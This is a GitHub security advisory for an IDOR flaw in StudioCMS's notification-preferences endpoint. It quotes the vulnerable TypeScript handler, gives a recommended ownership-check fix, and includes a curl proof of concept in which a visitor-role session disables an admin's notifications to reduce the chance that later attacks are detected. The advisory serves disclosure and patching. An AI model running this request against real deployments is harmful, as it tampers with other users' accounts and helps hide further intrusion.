# [M] StudioCMS: IDOR in User Notification Preferences Allows Any Authenticated User to Modify Any User's Settings

## Summary
Severity: Medium
Advisory: GHSA-9v82-xrm4-mp52
CVE: CVE-2026-32104
CWE: CWE-639
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L (CVSS_V3)
Published: 2026-03-12
Source: https://github.com/advisories/GHSA-9v82-xrm4-mp52
Type: github-advisory

## Affected
- npm: `studiocms` — affected >=0 <0.4.3

## Details
## Summary

The `updateUserNotifications` endpoint accepts a user ID from the request payload and uses it to update that user's notification preferences. It checks that the caller is logged in but never verifies that the caller owns the target account (`id !== userData.user.id`). Any authenticated visitor can modify notification preferences for any user, including disabling admin notifications to suppress detection of malicious activity.

## Details

The vulnerable handler is in `packages/studiocms/frontend/pages/studiocms_api/_handlers/dashboard/users.ts:257-311`:

```typescript
.handle(
    'updateUserNotifications',
    Effect.fn(function* ({ payload: { id, notifications } }) {
        // ...demo mode checks...

        const [sdk, userData] = yield* Effect.all([SDKCore, CurrentUser]);

        // Line 274: Only checks login + visitor level — any authenticated user passes
        if (!userData.isLoggedIn || !userData.userPermissionLevel.isVisitor) {
            return yield* new DashboardAPIError({ error: 'Unauthorized' });
        }

        // Line 280: Uses 'id' from payload — NOT userData.user.id
        const existingUser = yield* sdk.GET.users.byId(id);

        // Line 288: Updates target user using attacker-controlled 'id'
        const updatedData = yield* sdk.AUTH.user.update({
            userId: id,       // ← attacker controls this
            userData: {
                id,            // ← attacker controls this
                name: existingUser.name,
                username: existingUser.username,
                updatedAt: new Date().toISOString(),
                emailVerified: existingUser.emailVerified,
                createdAt: undefined,
                notifications,  // ← attacker controls this
            },
        });
    })
)
```

For comparison, the `updateUserProfile` handler in `dashboard/profile.ts` correctly uses `userData.user.id` instead of a user-supplied ID, preventing IDOR.

## PoC

```bash
# 1. Log in as a visitor-role user, obtain session cookie

# 2. Disable all notifications for the admin user
curl -X POST 'http://localhost:4321/studiocms_api/dashboard/update-user-notifications' \
  -H 'Cookie: studiocms-session=<visitor-session-token>' \
  -H 'Content-Type: application/json' \
  -d '{
    "id": "<admin-user-id>",
    "notifications": ""
  }'

# Expected: 403 Forbidden
# Actual: 200 {"message":"User notifications updated successfully"}
```

## Impact

- Any authenticated visitor can disable notification preferences for admin/owner accounts, suppressing alerts about new user creation, account changes, and user deletions
- Enables attack chaining — suppress admin notifications first, then perform other malicious actions with reduced detection risk
- Can modify any user's notification preferences (enable unwanted notifications or disable critical ones)

## Recommended Fix

Add an ownership check in `packages/studiocms/frontend/pages/studiocms_api/_handlers/dashboard/users.ts`:

```typescript
// After the login check at line 274, add:
if (id !== userData.user?.id && !userData.userPermissionLevel.isAdmin) {
    return yield* new DashboardAPIError({
        error: 'Unauthorized: cannot modify another user\'s notification preferences',
    });
}
```

## References
- https://github.com/withstudiocms/studiocms/security/advisories/GHSA-9v82-xrm4-mp52
- https://nvd.nist.gov/vuln/detail/CVE-2026-32104
- https://github.com/withstudiocms/studiocms
